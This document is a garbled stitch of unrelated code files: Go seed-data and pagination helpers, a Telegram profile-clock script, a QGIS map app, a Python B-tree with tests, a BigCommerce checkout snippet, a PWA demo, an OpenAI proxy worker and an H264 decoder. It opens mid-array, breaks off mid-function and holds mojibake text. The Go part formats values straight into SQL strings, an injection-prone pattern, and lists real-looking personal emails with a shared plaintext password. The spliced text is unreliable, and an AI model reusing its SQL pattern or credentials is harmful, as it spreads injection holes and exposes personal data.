		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
		{Name: ""Alice Jones"", Email: ""alice@example.com"", Password: ""alochym@123""},
		{Name: ""Do Nguyen Ha"", Email: ""hadn4@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Ngo Thi To Nhu"", Email: ""nhuntt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Hiep"", Email: ""hiepdt@fpt.com.vn"", Password: ""alochym@123""},
		{Name: ""Do Thi Kim Hoa"", Email: ""hoadtk@nhs.com.vn"", Password: ""alochym@123""},
	}


 for _, v := range users {
 sqlstmt := fmt.Sprintf(""INSERT INTO users(name, email, password) VALUES(\""%s\"", \""%s\"", \""%s\"")"",
 v.Name,
 v.Email,
 v.Password,
		)
 DB.Exec(sqlstmt)
	}
 w.Write([]byte(""Get All Snippet""))
}


// sqlHelper
// running sql command and return error
func sqlHelper(db *sql.DB, sqlstmt string) error {
 // Execute SQL Statements
 fmt.Println(sqlstmt)


 result, err := db.Exec(sqlstmt)


 // err check for DB operation
 if err != nil {
 return err
	}


 rowCount, err := result.RowsAffected()


 // error check for RowsAffected function
 if err != nil {
 return err
	}


 // there is no row found
 if rowCount == 0 {
 return sql.ErrNoRows
	}


 return nil
}


// Generated Pagination Meta data
func pagination(table string, limit, page int) *Pagination {
 var (
 tmpl = Pagination{}
 recordcount int
	)


 // Count all record
 sqltable := fmt.Sprintf(""SELECT count(id) FROM %s"", table)


 DB.QueryRow(sqltable).Scan(&recordcount)


 total := (recordcount / limit)


 // Calculator Total Page
 remainder := (recordcount % limit)
 if remainder == 0 {
 tmpl.TotalPage = total
	} else {
 tmpl.TotalPage = total + 1
	}


 // Set current/record per page meta data
 tmpl.CurrentPage = page
 tmpl.RecordPerPage = limit


 // Calculator the Next/Previous Page
 if page <= 0 {
 tmpl.Next = page + 1
	} else if page < tmpl.TotalPage {
 tmpl.Previous = page - 1
 tmpl.Next = page + 1
	} else if page == tmpl.TotalPage {
 tmpl.Previous = page - 1
 tmpl.Next = 0
	}


 return &tmpl
}
==<SEPERATOR>==
config.py
api_id = "" ""
api_hash = "" ""
from PIL import Image, ImageDraw, ImageFont
from datetime import datetime




def gentime():
 t = datetime.now()
 h = str(t.hour)
 m = str(t.minute)


 if len(m) == 1:
 m = f""0{m}""


 if len(h) == 1:
 h = f""0{h}""
 res = f""{h}:{m}""
 return res




def genimg():
 text = gentime()
 im = Image.open('2.jpg')
 font_msk = ImageFont.truetype(""arial.ttf"", 50)
 font_time = ImageFont.truetype(""impact.ttf"", 200)
 draw_text_msk = ImageDraw.Draw(im)
 draw_text_msk.text(xy=(250, 150), text=""�� �����ܬӬ� ��֬۬�Ѭ�"", font=font_msk, fill='#fff', align=""center"", anchor=""ms"")
 draw_text_time = ImageDraw.Draw(im)
 draw_text_time.text(xy=(250, 350), text=text, font=font_time, fill='#fff', align=""center"", anchor=""ms"")
 im.save(""3.jpg"")
from telethon import TelegramClient
from config import *
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
import asyncio
from datetime import datetime
import time
import imgen


client = TelegramClient(""avatarka"", api_id, api_hash)
client.start()
lasttime = datetime.now().minute




async def main():
 global lasttime
 while 1:
 nowtime = datetime.now().minute
 if lasttime != nowtime:
 imgen.genimg()
 time.sleep(2)
 await client(DeletePhotosRequest(await client.get_profile_photos('me')))
 await client(UploadProfilePhotoRequest(await client.upload_file('3.jpg')))
 lasttime = nowtime




asyncio.get_event_loop().run_until_complete(main())
"
"standalone-qgis3.py
","# Code borrowed from https://subscription.packtpub.com/book/application_development/9781783984985/1/ch01lvl1sec18/creating-a-standalone-application
# and upgraded for QGIS 3.0
import os
import sys
import shutil
import tempfile
import urllib.request
from zipfile import ZipFile
from glob import glob


from qgis.core import (QgsApplication, QgsCoordinateReferenceSystem, QgsFeature,
 QgsGeometry, QgsProject, QgsRasterLayer, QgsVectorLayer)
from qgis.gui import QgsLayerTreeMapCanvasBridge, QgsMapCanvas
from qgis.PyQt.QtCore import Qt
# Unused so commented
# from qgis.PyQt.QtGui import *


app = QgsApplication([], True)
# On Linux, didn't need to set it so commented
# app.setPrefixPath(""C:/Program Files/QGIS Brighton/apps/qgis"", True)
app.initQgis()
canvas = QgsMapCanvas()
canvas.setWindowTitle(""PyQGIS Standalone Application Example"")
canvas.setCanvasColor(Qt.white)
crs = QgsCoordinateReferenceSystem(3857)
project = QgsProject.instance()
canvas.setDestinationCrs(crs)


urlWithParams = 'type=xyz&url=https://a.tile.openstreetmap.org/%7Bz%7D/%7Bx%7D/%7By%7D.png&zmax=19&zmin=0&crs=EPSG3857'
rlayer2 = QgsRasterLayer(urlWithParams, 'OpenStreetMap', 'wms')


if rlayer2.isValid():
 project.addMapLayer(rlayer2)
else:
 print('invalid layer')


# Download shp ne_10m_admin_0_countries.shp and associated files in the same directory
url = ""https://www.naturalearthdata.com/http//www.naturalearthdata.com/download/10m/cultural/ne_10m_admin_0_countries.zip""
if not glob(""ne_10m_admin_0_countries.*""):
 with urllib.request.urlopen(url) as response:
 with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
 shutil.copyfileobj(response, tmp_file)
 with ZipFile(tmp_file.name, 'r') as zipObj:
 # Extract all the contents of zip file in current directory
 zipObj.extractall()


layer_shp = QgsVectorLayer(os.path.join(os.path.dirname(__file__), ""ne_10m_admin_0_countries.shp""), ""Natural Earth"", ""ogr"")
if not layer_shp.isValid():
 print(""Layer failed to load!"")


project.addMapLayer(layer_shp)


print(layer_shp.crs().authid())
print(rlayer2.crs().authid())
canvas.setExtent(layer_shp.extent())
canvas.setLayers([rlayer2, layer_shp])
canvas.zoomToFullExtent()
canvas.freeze(True)
canvas.show()
canvas.refresh()
canvas.freeze(False)
canvas.repaint()
bridge = QgsLayerTreeMapCanvasBridge(
 project.layerTreeRoot(),
 canvas
)


def run_when_project_saved():
 print('Saved')


project.projectSaved.connect(run_when_project_saved)


project.write('my_new_qgis_project.qgz')


def run_when_application_state_changed(state):
 print('State changed', state)


app.applicationStateChanged.connect(run_when_application_state_changed)


exitcode = app.exec()
QgsApplication.exitQgis()
sys.exit(exitcode)
==<SEPERATOR>==
btree.py
import math
import uuid




class BTree:
 def __init__(self, order=3):
 self.root = BTreeNode(order)


 def insert(self, toinsert):
 all_elements = self.list()


 new_self = BTree(self.root.order)
 new_node, middle, left, right = self.root.insert(toinsert)
 if middle is None:
 assert new_node is not None
 new_self.root = new_node
 else:
 # Otherwise, split at root.
 new_self.root.elements[0] = middle
 new_self.root.children[0] = left
 new_self.root.children[1] = right


 all_elements.append(toinsert)
 for el in all_elements:
 assert new_self.contains(el[""key""]), f""Expected {el} in {new_self.list()}\n{new_self.print()}""


 return new_self


 def contains(self, key):
 return self.root.contains(key)


 def list(self):
 return self.root.list()


 def print(self):
 def _print(node, level, self_id, parent_id):
 print([self_id, parent_id], "" "" * (level + 1) + str(node))


 print(""["")
 self.root.walk(_print)
 print(""]"")




class BTreeNode:
 def __init__(self, order=3):
 self.id = str(uuid.uuid4())[:8]
 self.order = order
 if self.order < 3:
 raise Exception(""BTree must have at least 2 children."")
 self.elements = [None for i in range(order - 1)]
 self.children = [None for i in range(order)]


 def walk(self, fn, level=0, parent_id=None):
 assert len(self.children) == self.order
 assert len(self.elements) == self.order - 1
 assert self.order >= 3


 for i, child in enumerate(self.children):
 if child is not None:
 child.walk(fn, level + 1, self.id)


 if i < len(self.elements):
 el = self.elements[i]
 if el is None:
 continue


 fn(el, level, self.id, parent_id)


 def contains(self, key):
 for i, child in enumerate(self.children):
 if i < len(self.elements):
 if self.elements[i] is not None:
 if key == self.elements[i][""key""]:
 return True
 elif key < self.elements[i][""key""] and child is not None:
 return child.contains(key)
 elif child is not None:
 return child.contains(key)
 elif child is not None:
 return child.contains(key)


 return False


 def list(self):
 l = []
 def _tolist(node, *args):
 l.append(node)


 self.walk(_tolist)
 return l


 def split(self, copy, children_copy):
 left_elements = copy[:self.order // 2]
 right_elements = copy[self.order // 2 + 1:]
 
 left = BTreeNode(self.order)
 
 left.elements[:self.order // 2] = left_elements
 left_children = children_copy[:self.order // 2 + 1]
 left.children[:len(left_children)] = left_children
 assert len(left.elements) == self.order - 1
 assert len(left.children) == self.order


 middle = copy[self.order // 2]


 right = BTreeNode(self.order)
 right.elements[:len(right_elements)] = right_elements
 right_children = children_copy[self.order // 2 + 1:]
 right.children[:len(right_children)] = right_children
 assert len(right.elements) == self.order - 1
 assert len(right.children) == self.order
 return None, middle, left, right


 def insert_leaf(self, toinsert):
 copy = self.elements.copy()
 location_to_insert = 0
 for e in copy:
 if e is None or toinsert[""key""] < e[""key""]:
 break
 location_to_insert += 1


 copy.insert(location_to_insert, toinsert)


 children_copy = self.children.copy()
 children_copy.insert(location_to_insert, None)
 
 has_space = self.elements.count(None) > 0
 if has_space:
 new_self = BTreeNode(self.order)
 assert copy[-1] is None
 copy.pop()
 new_self.elements = copy
 assert len(new_self.elements) == new_self.order - 1


 assert children_copy[-1] is None
 children_copy.pop()
 new_self.children = children_copy
 assert len(new_self.children) == new_self.order


 return new_self, None, None, None


 # Otherwise, no space, let's split.
 return self.split(copy, children_copy)


 def insert_child(self, toinsert, i, child):
 new_self = BTreeNode(self.order)
 new_self.elements = self.elements.copy()
 new_self.children = self.children.copy()


 ret, middle, left, right = child.insert(toinsert)
 if middle is None:
 new_self.children[i] = ret
 return new_self, None, None, None


 # No space, we must split.
 location_to_insert = 0
 for e in new_self.elements:
 if e is None or toinsert[""key""] < e[""key""]:
 break
 location_to_insert += 1


 new_self.elements.insert(location_to_insert, middle)
 assert sorted([x[""key""] if x is not None else math.inf for x in new_self.elements]) == \
            [x[""key""] if x is not None else math.inf for x in new_self.elements]
 new_self.children.insert(location_to_insert, None)


 new_self.children[location_to_insert] = left
 new_self.children[location_to_insert+1] = right


 has_space = self.elements.count(None) > 0
 if has_space:
 assert new_self.elements[-1] is None
 new_self.elements.pop()
 assert len(new_self.elements) == new_self.order - 1


 assert new_self.children[-1] is None
 new_self.children.pop()
 assert len(new_self.children) == new_self.order


 return new_self, None, None, None


 # No space, let's split.
 return self.split(new_self.elements, new_self.children)


 def insert(self, toinsert):
 is_leaf = self.children.count(None) == len(self.children)
 if is_leaf:
 return self.insert_leaf(toinsert)


 for i, child in enumerate(self.children):
 if i < len(self.elements):
 if self.elements[i] is None or \
 toinsert[""key""] < self.elements[i][""key""]:
 return self.insert_child(toinsert, i, child)                
 elif child is not None:
 return self.insert_child(toinsert, i, child)


 assert False
import os
import struct


from btree import BTree


def test(order, generated, debug=False):
 if debug: print(""Input"", generated)
 t = BTree(order)
 for i, v in enumerate(generated):
 if debug: print(""nth"", i+1)
 t = t.insert({
 ""key"": v,
 ""value"": v,
        })
 if debug: print(sorted(generated[:i+1]), [x[""key""] for x in t.list()])
 assert sorted(generated[:i+1]) == [x[""key""] for x in t.list()]
 if debug: t.print()


 if debug: print(""Output"")
 if debug: t.print()


 l = [x[""key""] for x in t.list()]
 if debug: print(l)


 s = sorted(generated)
 for i in range(len(s)):
 assert s[i] == l[i], f""wanted {s[i]}, got {l[i]}""
 assert len(l) == len(s), f""wanted: {len(s)}, got len(l)""
 
 assert sorted(generated) == [x[""key""] for x in t.list()]


# First insert backwards
generated = []
for i in list(reversed(range(10))):
 r = i
 generated.append(r)


test(3, generated)


# Then insert going forward.
generated = []
for i in list(range(10)):
 r = i
 generated.append(r)


test(3, generated)


# Then insert randomly.
generated = []
for _ in list(range(10)):
 r = struct.unpack('H', os.urandom(2))[0]
 generated.append(r)


test(3, generated)


generated = []
for _ in list(range(20)):
 r = struct.unpack('H', os.urandom(2))[0]
 generated.append(r)


test(8, generated)


# Now let's try some big ones.
for tree_size in [3, 100, 4096]:
 generated = []
 for _ in list(range(10000)):
 r = struct.unpack('H', os.urandom(2))[0]
 generated.append(r)


 test(tree_size, generated)
 print(tree_size, len(generated))
"
"bigcommerce-insert-custom-text-on-checkout-page.js
","<script>
(function() {
 var inserted = false;
 setInterval(function() {
 var el = document.getElementById('checkoutShippingAddress');
 if (el) {
 if (!inserted) {
 var note = ""<br><p style='margin-bottom:.7rem'><strong>PLEASE NOTE: Billing/Shipping information:</strong></p>""
 + ""<ul><li>The Billing Address must match the address that your credit card company has on file.</li>""
 + ""<li>You may enter a different Shipping Address on the Shipping section.</li></ul>"";
 var div = document.createElement('div');
 div.innerHTML = note;
 el.appendChild(div);
 inserted = true;
 }
 } else {
 inserted = false;
 }
 }, 500);
})();
</script>
==<SEPERATOR>==
app.js
const APP = {
 deferredInstall: null,
 init() {
 if ('serviceWorker' in navigator) {
 //register our service worker
 navigator.serviceWorker
 .register('/sw.js', {
 updateViaCache: 'none',
 scope: '/',
 })
 .then(() => {
 //finished registering
 })
 .catch((err) => {
 console.warn('Failed to register', err.message);
 });
 //listen for messages
 navigator.serviceWorker.addEventListener('message', ({ data }) => {
 //received a message from the service worker
 console.log(data, 'from service worker');
 });


 //listen for `appinstalled` event
 window.addEventListener('appinstalled', (evt) => {
 //deprecated but still runs in Chrome-based browsers.
 //Not very useful event.
 //Better to use the DOMContentLoaded and then look at how it was launched
 });


 //listen for `beforeinstallprompt` event
 window.addEventListener('beforeinstallprompt', (ev) => {
 // Prevent the mini-infobar from appearing on mobile
 ev.preventDefault();
 // Stash the event so it can be triggered later.
 APP.deferredInstall = ev;
 console.log('saved the install event');
 // Update UI notify the user they can install the PWA
 // if you want here...
 });


 let btn = document.getElementById('btnInstall');
 btn?.addEventListener('click', APP.startChromeInstall);
 }
 },
 startChromeInstall() {
 if (APP.deferredInstall) {
 console.log(APP.deferredInstall);
 APP.deferredInstall.prompt();
 APP.deferredInstall.userChoice.then((choice) => {
 if (choice.outcome == 'accepted') {
 //they installed
 console.log('installed');
 } else {
 console.log('cancel');
 }
 });
 }
 },
};
document.addEventListener('DOMContentLoaded', APP.init);
<!DOCTYPE html>
<html lang=""en"">
 <head>
 <meta charset=""UTF-8"" />
 <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"" />
 <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
 <title>PWA Install Events</title>
 <link rel=""stylesheet"" href=""./main.css"" />
 <!-- pwa manifest -->
 <link rel=""manifest"" href=""/manifest.json"" />
 <!-- Older android support -->
 <meta name=""theme-color"" content=""#bada55"" />
 <!-- ios support -->
 <link rel=""apple-touch-icon"" href=""/img/apple-touch-icon.png"" />
 <meta name=""apple-mobile-web-app-status-bar"" content=""#bada55"" />
 </head>
 <body>
 <header>
 <h1>PWA Install Events</h1>
 </header>
 <main>
 <p>
        Access to these events is currently limited to the Chrome|Chromium|Blink
        based browsers - Chrome, Edge, and Opera.
 </p>
 <p>
        Important to note, on iOS, all browsers are forced to use the Safari
        Webkit JavaScript Engine. This means that Firefox and Chrome lose some
        of their capabilities when running on an iOS device.
 </p>
 <p>
 <button id=""btnInstall"">INSTALL APP</button><br />
        Hide this button unless:
 <dl>
 <dt>Desktop</dt>
 <dd>Chrome</dd>
 <dd>Opera</dd>
 <dd>Edge</dd>
 <dt>Mobile</dt>
 <dd>Chrome</dd>
 <dd>Opera</dd>
 <dd>Edge</dd>
 <dd>Safari</dd>
 <dd>Firefox</dd>
 </dl><br/>
        For Safari and Firefox it will have to display instructions.
 </p>
 </main>
 <script src=""app.js"" defer></script>
 </body>
</html>
html {
 font-size: 20px;
 font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
    Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
 font-weight: 300;
 line-height: 1.5;
 background-color: #222;
 color: #eee;
}
body {
 background-color: inherit;
 color: inherit;
 min-height: 100vh;
 margin: 0;
}
header {
 padding: 1rem 2rem;
 background-color: #333;
 min-height: 10vw;
 width: 100vw;
 margin: 0;
}
main {
 background-color: #222;
 min-height: 85vw;
 margin: 0;
 padding: 5vw 2rem;
}
h1 {
 color: orangered;
 font-size: 4rem;
 line-height: 1;
 margin: 0.1rem 0;
}
h2 {
 color: orange;
 font-size: 2.4rem;
 line-height: 2;
 margin: 3rem 0 1rem;
 opacity: 0.64;
}
h3 {
 color: cornflowerblue;
 text-shadow: 1px 1px 1px white;
 font-size: 3.6rem;
}
span.isOnOff {
 font-weight: 900;
 color: cornflowerblue;
}
p {
 padding: 0;
 margin: 1rem 0;
 font-size: 1.2rem;
}
img {
 max-width: 100%;
 margin: 1rem;
}
/* PWA specific styles */
body.pwa main {
 position: relative;
 padding-left: 8rem;
}
body.pwa main::before {
 position: absolute;
 transform-origin: top left;
 transform: rotate(90deg) translateY(-4rem);
 content: 'PWA Rules!';
 font-size: 8rem;
 width: 10ch;
 line-height: 6rem;
 font-weight: 900;
 letter-spacing: 1px;
 padding: 0 10vw 0 0;
 margin: 1rem;
 color: #444;
 top: 0;
 left: 0;
}
{
 ""name"": ""Sample App"",
 ""short_name"": ""App"",
 ""display"": ""standalone"",
 ""start_url"": ""/index.html"",
 ""icons"": [
    {
 ""src"": ""/img/icon-152x152.png"",
 ""sizes"": ""152x152"",
 ""type"": ""image/png""
    },
    {
 ""src"": ""/img/icon-192x192.png"",
 ""sizes"": ""192x192"",
 ""type"": ""image/png""
    },
    {
 ""src"": ""/img/icon-384x384.png"",
 ""sizes"": ""384x384"",
 ""type"": ""image/png""
    },
    {
 ""src"": ""/img/icon-512x512.png"",
 ""sizes"": ""512x512"",
 ""type"": ""image/png""
    }
  ],
 ""orientation"": ""portrait-primary"",
 ""theme_color"": ""#bada55"",
 ""background_color"": ""#eeeeee"",
 ""prefer_related_applications"": false
}
const version = 6;
const preCacheName = `static-${version}`;
const preCache = ['/', '/index.html', '/404.html'];


self.addEventListener('install', (ev) => {
 //installed
 ev.waitUntil(
 caches
 .open(preCacheName)
 .then((cache) => {
 console.log('caching the static files');
 cache.addAll(preCache);
 })
 .catch(console.warn)
 );
 //load pre-cache
});


self.addEventListener('activate', (ev) => {
 //activating
 ev.waitUntil(
 caches
 .keys()
 .then((keys) => {
 return Promise.all(
 keys
 .filter((key) => key !== preCacheName)
 .map((key) => caches.delete(key))
 );
 })
 .catch(console.warn)
 );
 //delete old caches
});


self.addEventListener('fetch', (ev) => {
 //fetch request received
 //send back a response from cache or fetch
 ev.respondWith(
 caches.match(ev.request).then((cacheRes) => {
 return (
 cacheRes ||
 fetch(ev.request).then(
 (response) => {
 return response;
 },
 (err) => {
 //network failure
 //send something else from the cache?
 if (
 ev.request.url.indexOf('.html') > -1 ||
 ev.request.mode == 'navigation'
 ) {
 return caches.match('/404.html');
 }
 }
 )
 );
 })
 );
});


self.addEventListener('message', (ev) => {
 //message received
 //do things based on message props
 let data = ev.data;
 console.log('SW received', data);
});


const sendMessage = async (msg) => {
 let allClients = await clients.matchAll({ includeUncontrolled: true });
 return Promise.all(
 allClients.map((client) => {
 let channel = new MessageChannel();
 return client.postMessage(msg);
 })
 );
};
"
"openai-proxy.js
","async function handleRequest(request) {
 const url = new URL(request.url)
 url.host = ""api.openai.com""
 return fetch(url, { headers: request.headers, method: request.method, body: request.body })
}
addEventListener(""fetch"", (event) => {
 event.respondWith(handleRequest(event.request))
})
==<SEPERATOR>==
H264_Decoder.cpp
#include ""H264_Decoder.h""


H264_Decoder::H264_Decoder(h264_decoder_callback frameCallback, void* user) 
  :codec(NULL)
  ,codec_context(NULL)
  ,parser(NULL)
  ,fp(NULL)
  ,frame(0)
  ,cb_frame(frameCallback)
  ,cb_user(user)
  ,frame_timeout(0)
  ,frame_delay(0)
{
 avcodec_register_all();
}


H264_Decoder::~H264_Decoder() {


 if(parser) {
 av_parser_close(parser);
    parser = NULL;
  }


 if(codec_context) {
 avcodec_close(codec_context);
 av_free(codec_context);
    codec_context = NULL;
  }


 if(picture) {
 av_free(picture);
    picture = NULL;
  }


 if(fp) {
 fclose(fp);
    fp = NULL;
  }


  cb_frame = NULL;
  cb_user = NULL;
  frame = 0;
  frame_timeout = 0;
}


bool H264_Decoder::load(std::string filepath, float fps) {


  codec = avcodec_find_decoder(AV_CODEC_ID_H264);
 if(!codec) {
 printf(""Error: cannot find the h264 codec: %s\n"", filepath.c_str());
 return false;
  }


  codec_context = avcodec_alloc_context3(codec);


 if(codec->capabilities & CODEC_CAP_TRUNCATED) {
    codec_context->flags |= CODEC_FLAG_TRUNCATED;
  }


 if(avcodec_open2(codec_context, codec, NULL) < 0) {
 printf(""Error: could not open codec.\n"");
 return false;
  }


  fp = fopen(filepath.c_str(), ""rb"");


 if(!fp) {
 printf(""Error: cannot open: %s\n"", filepath.c_str());
 return false;
  }


  picture = av_frame_alloc();
  parser = av_parser_init(AV_CODEC_ID_H264);


 if(!parser) {
 printf(""Erorr: cannot create H264 parser.\n"");
 return false;
  }




 if(fps > 0.0001f) {
    frame_delay = (1.0f/fps) * 1000ull * 1000ull * 1000ull;
    frame_timeout = rx_hrtime() + frame_delay;
  }


 // kickoff reading...
 readBuffer();


 return true;
}


bool H264_Decoder::readFrame() {


 uint64_t now = rx_hrtime();
 if(now < frame_timeout) {
 return false;
  }


 bool needs_more = false;


 while(!update(needs_more)) { 
 if(needs_more) {
 readBuffer();
    }
  }


 // it may take some 'reads' before we can set the fps
 if(frame_timeout == 0 && frame_delay == 0) {
 double fps = av_q2d(codec_context->time_base);
 if(fps > 0.0) {
      frame_delay = fps * 1000ull * 1000ull * 1000ull;
    }
  }


 if(frame_delay > 0) {
    frame_timeout = rx_hrtime() + frame_delay;
  }


 return true;
}


void H264_Decoder::decodeFrame(uint8_t* data, int size) {


  AVPacket pkt;
 int got_picture = 0;
 int len = 0;


 av_init_packet(&pkt);


  pkt.data = data;
  pkt.size = size;


  len = avcodec_decode_video2(codec_context, picture, &got_picture, &pkt);
 if(len < 0) {
 printf(""Error while decoding a frame.\n"");
  }


 if(got_picture == 0) {
 return;
  }


  ++frame;


 if(cb_frame) {
 cb_frame(picture, &pkt, cb_user);
  }
}


int H264_Decoder::readBuffer() {


 int bytes_read = (int)fread(inbuf, 1, H264_INBUF_SIZE, fp);


 if(bytes_read) {
 std::copy(inbuf, inbuf + bytes_read, std::back_inserter(buffer));
  }


 return bytes_read;
}


bool H264_Decoder::update(bool& needsMoreBytes) {


  needsMoreBytes = false;


 if(!fp) {
 printf(""Cannot update .. file not opened...\n"");
 return false;
  }


 if(buffer.size() == 0) {
    needsMoreBytes = true;
 return false;
  }


 uint8_t* data = NULL;
 int size = 0;
 int len = av_parser_parse2(parser, codec_context, &data, &size, 
                             &buffer[0], buffer.size(), 0, 0, AV_NOPTS_VALUE);


 if(size == 0 && len >= 0) {
    needsMoreBytes = true;
 return false;
  }


 if(len) {
 decodeFrame(&buffer[0], size);
    buffer.erase(buffer.begin(), buffer.begin() + len);
 return true;
  }


 return false;
}
/*

  H264_Decoder
  ---------------------------------------

  Example that shows how to use the libav parser system. This class forces a 
  H264 parser and codec. You use it by opening a file that is encoded with x264 
  using the `load()` function. You can pass the framerate you want to use for playback.
  If you don't pass the framerate, we will detect it as soon as the parser found 
  the correct information.

  After calling load(), you can call readFrame() which will read a new frame when
  necessary. It will also make sure that it will read enough data from the buffer/file
  when there is not enough data in the buffer.

  `readFrame()` will trigger calls to the given `h264_decoder_callback` that you pass
  to the constructor. 

 */
#ifndef H264_DECODER_H
#define H264_DECODER_H


#define H264_INBUF_SIZE 16384 /* number of bytes we read per chunk */


#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <tinylib.h>


extern ""C"" {
#include <libavcodec/avcodec.h>
#include <libavutil/avutil.h>
}


typedef void(*h264_decoder_callback)(AVFrame* frame, AVPacket* pkt, void* user);         /* the decoder callback, which will be called when we have decoded a frame */


class H264_Decoder {


 public:
 H264_Decoder(h264_decoder_callback frameCallback, void* user);                         /* pass in a callback function that is called whenever we decoded a video frame, make sure to call `readFrame()` repeatedly */
 ~H264_Decoder();                                                                       /* d'tor, cleans up the allocated objects and closes the codec context */
 bool load(std::string filepath, float fps = 0.0f);                                     /* load a video file which is encoded with x264 */
 bool readFrame();                                                                      /* read a frame if necessary */


 private:
 bool update(bool& needsMoreBytes);                                                     /* internally used to update/parse the data we read from the buffer or file */
 int readBuffer();                                                                      /* read a bit more data from the buffer */
 void decodeFrame(uint8_t* data, int size);                                             /* decode a frame we read from the buffer */


 public:
  AVCodec* codec;                                                                        /* the AVCodec* which represents the H264 decoder */
  AVCodecContext* codec_context;                                                         /* the context; keeps generic state */
  AVCodecParserContext* parser;                                                          /* parser that is used to decode the h264 bitstream */
  AVFrame* picture;                                                                      /* will contain a decoded picture */
 uint8_t inbuf[H264_INBUF_SIZE + FF_INPUT_BUFFER_PADDING_SIZE];                         /* used to read chunks from the file */
  FILE* fp;                                                                              /* file pointer to the file from which we read the h264 data */
 int frame;                                                                             /* the number of decoded frames */
  h264_decoder_callback cb_frame;                                                        /* the callback function which will receive the frame/packet data */
 void* cb_user;                                                                         /* the void* with user data that is passed into the set callback */
 uint64_t frame_timeout;                                                                /* timeout when we need to parse a new frame */
 uint64_t frame_delay;                                                                  /* delay between frames (in ns) */
  std::vector<uint8_t> buffer;                                                           /* buffer we use to keep track of read/unused bitstream data */
};


#endif
/*
 
  BASIC GLFW + GLXW WINDOW AND OPENGL SETUP 
  ------------------------------------------
  See https://gist.github.com/roxlu/6698180 for the latest version of the example.
 
*/
#include <stdlib.h>
#include <stdio.h>


#if defined(__linux) || defined(_WIN32)
#  include <GLXW/glxw.h>
#endif
 
#define GLFW_INCLUDE_GLCOREARB
#include <GLFW/glfw3.h>


#define ROXLU_USE_MATH
#define ROXLU_USE_PNG
#define ROXLU_USE_OPENGL
#define ROXLU_IMPLEMENTATION
#include <tinylib.h>


#include ""H264_Decoder.h""
#include ""YUV420P_Player.h""
H264_Decoder* decoder_ptr = NULL;
YUV420P_Player* player_ptr = NULL;
bool playback_initialized = false;


void button_callback(GLFWwindow* win, int bt, int action, int mods);
void cursor_callback(GLFWwindow* win, double x, double y);
void key_callback(GLFWwindow* win, int key, int scancode, int action, int mods);
void char_callback(GLFWwindow* win, unsigned int key);
void error_callback(int err, const char* desc);
void resize_callback(GLFWwindow* window, int width, int height);


void frame_callback(AVFrame* frame, AVPacket* pkt, void* user);
void initialize_playback(AVFrame* frame, AVPacket* pkt);


int main() {


 glfwSetErrorCallback(error_callback);
 
 if(!glfwInit()) {
 printf(""Error: cannot setup glfw.\n"");
 return false;
  }
 
 glfwWindowHint(GLFW_SAMPLES, 4);
 glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);
 glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 2);
 glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);
 glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);
 
  GLFWwindow* win = NULL;
 int w = 1516;
 int h = 853;


#if 0
  w = 320;
  h = 240;
#endif
 
  win = glfwCreateWindow(w, h, ""GLFW"", NULL, NULL);
 if(!win) {
 glfwTerminate();
 exit(EXIT_FAILURE);
  }


 glfwSetFramebufferSizeCallback(win, resize_callback);
 glfwSetKeyCallback(win, key_callback);
 glfwSetCharCallback(win, char_callback);
 glfwSetCursorPosCallback(win, cursor_callback);
 glfwSetMouseButtonCallback(win, button_callback);
 glfwMakeContextCurrent(win);
 glfwSwapInterval(1);
 
#if defined(__linux) || defined(_WIN32)
 if(glxwInit() != 0) {
 printf(""Error: cannot initialize glxw.\n"");
 ::exit(EXIT_FAILURE);
  }
#endif
 
 // ----------------------------------------------------------------
 // THIS IS WHERE YOU START CALLING OPENGL FUNCTIONS, NOT EARLIER!!
 // ----------------------------------------------------------------
  H264_Decoder decoder(frame_callback, NULL);
  YUV420P_Player player;


  player_ptr = &player;
  decoder_ptr = &decoder;
 
 if(!decoder.load(rx_to_data_path(""bunny.h264""), 30.0f)) {
 ::exit(EXIT_FAILURE);
  }


 while(!glfwWindowShouldClose(win)) {
 glClearColor(0.0f, 0.0f, 0.0f, 1.0f);
 glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);


    decoder.readFrame();
    player.draw(0, 0, w, h);


 glfwSwapBuffers(win);
 glfwPollEvents();
  }
 
 glfwTerminate();
 
 return EXIT_SUCCESS;
}
 
void key_callback(GLFWwindow* win, int key, int scancode, int action, int mods) {
 
 if(action != GLFW_PRESS) {
 return;
  }


 switch(key) {
 case GLFW_KEY_ESCAPE: {
